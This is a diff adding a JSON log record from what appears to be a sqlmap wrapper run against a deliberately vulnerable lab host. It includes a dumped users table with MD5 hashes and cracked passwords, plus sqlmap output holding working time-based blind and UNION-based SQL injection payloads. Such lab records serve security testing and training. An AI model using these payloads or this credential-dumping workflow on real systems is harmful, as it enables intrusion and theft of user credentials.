@@ -1,0 +1,29 @@
+[
+  {
+    "timestamp": "2025-11-09 14:59:30Z",
+    "target": "http://192.168.56.10/vulnerabilities/sqli/?id=1",
+    "options": {
+      "dbs": false,
+      "tables": false,
+      "columns": false,
+      "dump": false,
+      "dump_all": false,
+      "users": false,
+      "passwords": true,
+      "roles": false,
+      "selected_db": null,
+      "selected_table": null,
+      "threads": 1,
+      "level": null,
+      "risk": null,
+      "extra_args": null
+    },
+    "summary": "passwords",
+    "returncode": -1,
+    "output_dir": "/home/kali/.local/share/sqlmap/output/192.168.56.10",
+    "dump_path": "/home/kali/.local/share/sqlmap/output/192.168.56.10/dump/dvwa/users.csv",
+    "dump_preview": "user_id,user,avatar,password,last_name,first_name\n1,admin,http://172.16.123.129/dvwa/hackable/users/admin.jpg,5f4dcc3b5aa765d61d8327deb882cf99 (password),admin,admin\n2,gordonb,http://172.16.123.129/dvwa/hackable/users/gordonb.jpg,e99a18c428cb38d5f260853678922e03 (abc123),Brown,Gordon\n3,1337,http://172.16.123.129/dvwa/hackable/users/1337.jpg,8d3533d75ae2c3966d7e0d4fcc69216b (charley),Me,Hack\n4,pablo,http://172.16.123.129/dvwa/hackable/users/pablo.jpg,0d107d09f5bbe40cade3de5c71e9e9b7 (letmein),Picasso,Pablo\n5,smithy,http://172.16.123.129/dvwa/hackable/users/smithy.jpg,5f4dcc3b5aa765d61d8327deb882cf99 (password),Smith,Bob\n",
+    "log_path": "/home/kali/.local/share/sqlmap/output/192.168.56.10/log",
+    "log_preview": "sqlmap identified the following injection point(s) with a total of 119 HTTP(s) requests:\n---\nParameter: username (GET)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: page=user-info.php&username=admin' AND (SELECT 5070 FROM (SELECT(SLEEP(5)))DjCm) AND 'eCZH'='eCZH&password=password&user-info-php-submit-button=View Account Details\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 5 columns\n    Payload: page=user-info.php&username=admin' UNION ALL SELECT NULL,CONCAT(0x71766b6b71,0x4d686a6741494348614c6f774251435747664850427753464c5972627a59564f6c4e666756665845,0x717a706b71),NULL,NULL,NULL-- -&password=password&user-info-php-submit-button=View Account Details\n---\nweb server operating system: Linux Ubuntu 8.04 (Hardy Heron)\nweb application technology: PHP, Apache 2.2.8, PHP 5.2.4\nback-end DBMS: MySQL >= 5.0.12\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: username (GET)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: page=user-info.php&username=admin' AND (SELECT 5070 FROM (SELECT(SLEEP(5)))DjCm) AND 'eCZH'='eCZH&password=password&user-info-php-submit-button=View Account Details\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 5 columns\n    Payload: page=user-info.php&username=admin' UNION ALL SELECT NULL,CONCAT(0x71766b6b71,0x4d686a6741494348614c6f774251435747664850427753464c5972627a59564f6c4e666756665845,0x717a706b71),NULL,NULL,NULL-- -&password=password&user-info-php-submit-button=View Account Details\n---\nweb server operating system: Linux Ubuntu 8.04 (Hardy Heron)\nweb application technology: PHP, Apache 2.2.8, PHP 5.2.4\nback-end DBMS: MySQL >= 5.0.12\navailable databases [7]:\n[*] dvwa\n[*] information_schema\n[*] metasploit\n[*] mysql\n[*] owasp10\n[*] tikiwiki\n[*] tikiwiki195\n\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: username (GET)\n    Type: time-based blind\n"
+  }
+]
